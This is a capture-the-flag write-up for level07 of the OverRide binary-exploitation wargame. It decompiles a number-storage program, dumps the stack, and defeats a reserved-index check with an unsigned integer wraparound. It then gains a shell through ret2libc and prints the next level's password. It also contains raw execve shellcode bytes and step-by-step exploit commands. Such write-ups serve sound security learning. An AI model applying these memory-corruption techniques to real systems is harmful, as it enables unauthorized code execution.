# level07

### First analysis

The securities on this program are interesting considering the code we will analyse right after:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

So here we have a Partial RELRO which we know doesn't protect a lot, we also have a stack Canary and NX is disabled. Let's now see the code and understand why these securities are interesting:

```c
unsigned int    get_unum() {
    unsigned int    input;

    fflush(stdout);
    scanf("%u", &input);

    return input;
}

int store_number(int *tab) {
    unsigned int    nbr;
    unsigned int    index;

    printf(" Number: ");
    nbr = get_unum();
    printf(" Index: ");
    index = get_unum();

    if (index % 3 == 0 || (nbr >> 24) == 183) // 30601641984
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    tab[index] = nbr;

    return 0;
}

int read_number(int *tab) {
    unsigned int    index;

    printf(" Index: ");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, tab[index]);

    return 0;
}

int main(int ac, char **av, char **env) {
    int     tab[100];
    char    cmd[24];
    int     cmd_res;

    memset(tab, 0, 0x190);
    memset(cmd, 0, 0x18);

    while (*av) {
        memset((void *)*av, 0, strlen(*av));
        ++av;
    }
    while (*env) {
        memset((void *)*env, 0, strlen(*env));
        ++env;
    }
    puts("----------------------------------------------------");
    puts("  Welcome to wil's crappy number storage service!   ");
    puts("----------------------------------------------------");
    puts(" Commands:                                          ");
    puts("    store - store a number into the data storage    ");
    puts("    read  - read a number from the data storage     ");
    puts("    quit  - exit the program                        ");
    puts("----------------------------------------------------");
    puts("   wil has reserved some storage :>                 ");
    puts("----------------------------------------------------");

    while (1) {
        printf("Input Command: ");
        fgets(cmd, sizeof(cmd), stdin);
        cmd[strlen(cmd) - 1] = '\0';

        if (!strncmp(cmd, "store", 5)) {
            cmd_res = store_number(tab);
        } else if (!strncmp(cmd, "read", 4)) {
            cmd_res = read_number(tab);
        } else if (!strncmp(cmd, "quit", 4)) {
            return 0;
        }

        if (cmd_res) {
            printf(" Failed to do %s command\n", cmd);
        } else {
            printf(" Completed %s command successfully\n", cmd);
        }

        memset(cmd, 0, sizeof(cmd));
    }

    return 0;
}
```

This code is pretty long, but what it does is wait for a user input that can be or store, or read or quit. Store will store a number somewhere in an array of 100 int. Read will read a number in this same array of 100 int, and quit will leave the program. There is a way to detect if a command is not recognized, and if we overflow command it doesn't segfault, just execute a second command as we can see here:

```sh
Input command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCC
 Failed to do AAAAAAAAAAAAAAAAAA command
Input command:  Failed to do AAAAAAAAAAAAAAAABB command
Input command:  Failed to do BBBBBBBBBBBBBBBBBB command
Input command:  Failed to do BBBBBCCCCCCCCCCCCC command
Input command:  Failed to do CCCCC command
```

So now why the security measures are interesting ? Well we have a stack canary, which we are gonna discuss a little more after, that is supposed to detect buffer overflow and close the program before anything is executed. However every time we had a stack canary on past levels, there were all levels containing the solutions (containing a system("/bin/sh") that will be executed through certains conditions for instance). The level06 was like that, a stack canary but had:

```c
if (!auth(buffer, password)) {  
    puts("Authenticated!");
    system("/bin/sh");
}
```

Or level03 that also had a canary found but contained this:

```c
if (!strcmp(str, "Congratulations!"))
    return system("/bin/sh");
```

So here we have a stack canary but we actually need to interact with the stack which can lead to some new issues we haven't faced before (finally). So before considering that let's try with our two favorites methods, the shell env variable and the ret2libc.

### Ret2LibC

We are now comfortable with this methods, thankfully since we already did this method on this machine and that PIE is still not activated on this binary, it means that the addresses of exit, system, and "/bin/sh" are the same as before. We can still verify to make sure of it and we manage to get:

```sh
(gdb) info function system
[...]
0xf7e6aed0  system

(gdb) info function exit
[...]
0xf7e5eb70  exit

(gdb) info proc map
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

level07@OverRide:~$ strings -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh
```

So we indeed have the exact same addresses as we had with this method used on this machine already:
- 0xf7e6aed0 for system
- 0xf7e5eb70 for exit
- 0xf7e2c000 + 15d7ec = f7f897ec for "/bin/sh"

We now need to read the memory or at least find the offset to know where to place our exploit. We are going to print a big memory dump right below, this is a command that read the stack by exploiting the program and printing what is in the 101st element of the tab that only has a size of 100, so we can read the stack. We also read what's in the tab itself, but it is just 0 from 0 to 100 (unless with store a value but it's irrelevent to exploit this program yet):

_To explain what this command does quickly, it iterates from 0 to 199 "for i in {0..199};", it then store into num for each iteration a number. This number is the result of printing read, the index and quit "do num=$(echo -e "read\n$i\nquit"" Into a pipe that executes level07 " | ./level07" and that also redirect it's result to another pipe with awk that only takes the lines containing Number at since it's the only line containing interesting informations " | awk '/Number at/ {print $NF}')" it prints it using $NF in order to take the last word and only the last word of the line which is the value stored at this index. So now we have the number at each index of the memory but it's in decimal so we do a little more. We printf a Number at data[%d] with %d being the current iteration, so which memory space (index) we are analysing and adding 0x%x\n to print in hexadecimal $num, that stored the number in the memory space "printf "Number at data[%d] is 0x%x\n" "$i" "$num"" This way we get actual addresses/stack elements that we can work with instead of decimals that doesn't make any sense. Since the number stored are unsigned int we need a temp store for num, that's why we decompose command in two lines._

```sh
level07@OverRide:~$ for i in {0..199}; do num=$(echo -e "read\n$i\nquit" | ./level07 | awk '/Number at/ {print $NF}'); printf "Number at data[%d] is 0x%x\n" "$i" "$num"; done
[...]
Number at data[99] is 0x0
Number at data[100] is 0x1
Number at data[101] is 0x64616572 # daer
Number at data[102] is 0x0
Number at data[103] is 0x0
Number at data[104] is 0x0
Number at data[105] is 0x0
Number at data[106] is 0x42c13b00 # stack canary
Number at data[107] is 0xf7feb620
Number at data[108] is 0x0
Number at data[109] is 0x8048a09
Number at data[110] is 0xf7fceff4
Number at data[111] is 0x0
Number at data[112] is 0x0
Number at data[113] is 0x0
Number at data[114] is 0xf7e45513
Number at data[115] is 0x1
Number at data[116] is 0xffffd794
Number at data[117] is 0xffffd79c
Number at data[118] is 0xf7fd3000
Number at data[119] is 0x0
Number at data[120] is 0xffffd71c
Number at data[121] is 0xffffd79c
Number at data[122] is 0x0
Number at data[123] is 0x80482b8
Number at data[124] is 0xf7fceff4
Number at data[125] is 0x0
Number at data[126] is 0x0
Number at data[127] is 0x0
Number at data[128] is 0x561cad7a
Number at data[129] is 0x8d2cd7c8
Number at data[130] is 0x0
[...]
```

This command took a lot of time to make but is worth it. Now we need to know where to overwrite something. Since the way we can overflow this program is by storing a value at an index over 100, we made a command that store the same value between 99 and 199 to see where it overflows but something interesting happened:

```sh
level07@OverRide:~$ for i in {99..199}; do echo -e "store\n1111\n$i\nquit" | ./level07 | awk '/SIGSEV/'; done
*** stack smashing detected ***:  terminated
======= Backtrace: =========
/lib32/libc.so.6(__fortify_fail+0x45)[0xf7f2f615]
/lib32/libc.so.6(+0x1035ca)[0xf7f2f5ca]
[0x80489ea]
/lib32/libc.so.6(__libc_start_main+0xf3)[0xf7e45513]
[0x8048531]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:11 12885                              /home/users/level07/level07
[...]
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
```

We didn't try it just with SIGSEV, we tried without awk to check the full output, but no segfault found, just this stack smashing detected. The other interesting thing that happen is that every 3 index, we get this message:

```sh
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
```

And this is due to this part of the program:

```c
if (index % 3 == 0 || (nbr >> 24) == 183) // 30601641984
{
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}
```

This bit of program protect an index every 3 indexes. Which means if we didn't receive any segfault, it means that the return address is probably one protected by this condition. In any case even if we found it, for Ret2LibC we need to write into 3 different memory spaces for the exit address, the system address and the "/bin/sh" address. This program seems especially designed to be protected from Ret2LibC exploits. However this doesn't explain the stack smashing error we got.

### Stack Canary

Now we know that Ret2LibC is impossible in our current way of interacting with the program, we have to understand this smashing stack error. The quick answer after very little researches is: The stack Canary. We already explained a little bit in RainFall what a Stack Canary is, but we are gonna dive into it a little more. A stack Canary is a random value placed before the return value that will be checked, if this random value changed it means that the stack has been modified, in this case we get our smashing stack error. Important to know, on linux this stack canary always ends with 00, which allows it to end strings that could have overflow, but makes it easier to identify. And indeed when we printed the stack we had at position 106 this value: 0x42c13b00 which doesn't look like an address, and ends with 00. We then launched the command that read the stack to see if this value was indeed randomized and these are some output we got:

```sh
Number at data[106] is 0x748edd00
Number at data[106] is 0x9684bc00
Number at data[106] is 0xcb10a000
```

These values indeed correspond to the logic of a stack canary. We have to be very carefull not to change it no matter what the solution we will use will be.

However even with these knowledges, the return address seems to be protected by this will security and without that even a shell code in env variable method won't work since we need this return address.

### Int overflow

We know that env variable shellcode is not working, Ret2LibC is not working either, and we have a stack canary that we have to be carefull not to overwrite. The only thing is we can select precisely where to write something into the memory so this stack canary shouldn't be a problem. We have to focus on something else to find the solution like how to pass through this will limitation.

And there is actually a way we can think of to workaround this limitation. As we know there are limits to everything in computer science, for example the maximum value we can enter in an int is 2,147,483,647, if we type a value that is greater than that, we will have a int overflow, and this will switch the int from a very high positive number to a very low negative number. That's what provoke the sadly very well known [Ariane flight V88](https://en.wikipedia.org/wiki/Ariane_flight_V88) accident in 1996. So now that we have that we can imagine to type an Index so high, that it accesses the index we want without being stuck into the will condition. Our target here is index 114. Why ? Because over all the addresses that we can find close to the stack canary this is the only one protected by the will conditions. If it was one of the other addresses, a sigsev would have happened when overwriting these values. So it must be the index 114 address that has the return value, or another value way further in the stack, but we are gonna start to test it with 114.

So how do we reach this index 114 with a by looping around using a int overflow ? Let's start with a naive idea and dissect through it until we reach the answer. INT_MAX + index could be a solution, so we basically take INT_MAX which is 2,147,483,647 we add it 114, and this should loop to fall again on 114 right ? Well not really, if we do that we will actually obtain something like -2,147,483,533. Yes INT_MAX represent a signed number that can have negative values, so to obtain 0 again we would have to add a lot more something like INT_MAX * 2 + Index, that can also be written UINT_MAX + Index, since UINT_MAX represent the max value of an unsigned int, so INT_MAX * 2. We are getting closer but this won't work, but why ?

When dealing with int array or any arrays that contains data larger than 1 bit, what the system call will do to access the right address of the memory is multiply the index by the size of the data stored in the array. For example, an array containing int would take the index entered, multiply it by 4, the size of an int, and would then use the result to access the right memory space. With 114 it would give something like that:

```
Index asked = 114
Memory space    = Start address + Index * sizeof typedata
                = Start address + 114 * sizeof int
                = Start address + 114 * 4
                = Start address + 456
```

Since addresses are handled as unsigned int, int means that to reach the address 0xFFFFFFFF, we just need to type UINT_MAX / 4. This will try to access tab[UINT_MAX / 4], and when the syscall will try to access it it will do (UINT_MAX / 4) * 4 which is the higher tab slot that we can access. Even if the index is not near INT_MAX or UINT_MAX the fact that it stores int makes this limit way smaller. So we can try something like UINT_MAX / 4 + 114 = 1073741938. This will be multipled by the syscall by 4, so will reach the UINT_MAX limit, and access to the right index being at 456 addresses away from 0 which is 114 in sizeof int. And this is what we get in gdb:

```sh
Input command: store
 Number: 11111
 Index: 1073741938
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x00002b67 in ?? ()
(gdb) 
```

The program segfault at address 0x00002b67, which is exactly in hexadecimal 11111, so it seems like 114 was indeed the return value.

### Solution

Now that we are able to avoid this will restriction, we still can't use the Ret2LibC, however we can use the shellcode in the env variable to finish this exercise so let's do it as we always do using the env_address.c file in Resources folder to find the address of the shellcode location, remember to use -m32 flag with gcc, the ELF file we are working on is in 32bit so using 32bit address system and we get:

```sh
level07@OverRide:~$ export SHELLCODE=$(python -c "print('\x90' * 50 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
level07@OverRide:/tmp$ gcc -m32 env_address.c -o env
Searching address of SHELLCODE env variable:
Big-endian format: 0xffffd8d3
Lil-endian format: \xd3\xd8\xff\xff
```

For once we are gonna use the big endian format and convert it into decimal which is 0xffffd8d3 => 4294957267. By storing this number into 114th index, we should be able to execute our shellcode, let's try that:

```sh
level07@OverRide:~$ ./level07 
[...]
Input command: store
 Number: 4294957267
 Index: 1073741938
 Completed store command successfully
Input command: quit
Segmentation fault (core dumped)
```

There is apparently still something off. Though we know that the return address is this one, first because of the segfault, but also because if we try the Ret2LibC method with only system and /bin/sh addresses we get this:

```sh
evel07@OverRide:~$ ./level07
Input command: store
 Number: 4159090384     # 0xf7e6aed0 in decimal (system address)
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172     # 0xf7f897ec in decimal ("/bin/sh" address)
 Index: 1073741939
 Completed store command successfully
Input command: quit
sh: 1: ����: not found
Segmentation fault (core dumped)
```

So something is indeed executed we just have to find why it doesn't work properly. However since we can go around the will problem by overflowing an int, we can still access the data that were available even with this will restriction, which mean we can actually try to do the Ret2LibC method by overflowing the 114th index of the tab, and use regular index for the two next ones we need for exit address and /bin/sh addresses, let's try that with the three addresses we needed:

- 0xf7e6aed0 for system                             =>  4159090384 in decimal
- 0xf7e5eb70 for exit                               =>  4159040368 in decimal
- 0xf7e2c000 + 15d7ec = f7f897ec for "/bin/sh"      =>  4160264172 in decimal

```sh
level07@OverRide:~$ ./level07 
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

With this it works perfectly. But why it didn't work with the env variable then ? Well maybe we should have spent a little more time analyzing the code that has a very very easy to understand answer to that:

```c
while (*av) {
    memset((void *)*av, 0, strlen(*av));
    ++av;
}
while (*env) {
    memset((void *)*env, 0, strlen(*env));
    ++env;
}
```

This code actually cleans every argument received which means, the env variables are cleaned too and the shellcode is lost. When we then send the address of the shellcode, well it was pointing to nowhere, nothing can happen since everything was deleted. Ret2LibC was then the solution by switching between int overflows and regular indexes, and we can now obtain the flag:

```sh
level07@OverRide:~$ ./level07
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## Important doc

[Stack Canaries explained](https://ir0nstone.gitbook.io/notes/binexp/stack/canaries)
